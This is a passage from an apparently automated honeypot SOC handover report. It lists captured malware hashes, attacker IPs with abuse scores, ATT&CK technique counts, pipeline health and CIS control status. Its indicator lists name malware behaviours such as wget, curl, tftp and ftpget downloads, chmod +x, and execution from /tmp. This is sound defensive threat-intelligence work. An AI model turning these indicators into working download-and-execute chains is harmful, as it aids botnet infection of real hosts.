| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `83.177.240[.]182` | SE | Tele2 Sverige AB | **100** ⚠️ | 1 |
| `78.72.168[.]178` | SE | Telia Network Services | **100** ⚠️ | 1 |
| `46.59.108[.]247` | SE | Bahnhof AB | **100** ⚠️ | 1 |
| `65.20.158[.]10` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `45.79.207[.]71` | US | Linode | **100** ⚠️ | 50 |
| `124.88.174[.]143` | CN | China Unicom Xinjiang province network | **100** ⚠️ | 50 |
| `92.204.128[.]149` | US | Host Europe GmbH | **100** ⚠️ | 30 |
| `46.59.91[.]172` | SE | Bahnhof AB | **100** ⚠️ | 2 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 129 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 117 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 35 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 35 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 34 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 10 |
| AbuseIPDB score 16 below threshold 25 | 5 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| AbuseIPDB score 7 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 189 cases |
| Tool 34  | Credential Extractor        | ✅ 132 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 75 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (13.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 56 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 117 priority case(s) shown individually · 27 recon entry/entries in table (7 group(s) consolidating 26 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-23T16:30:12Z_
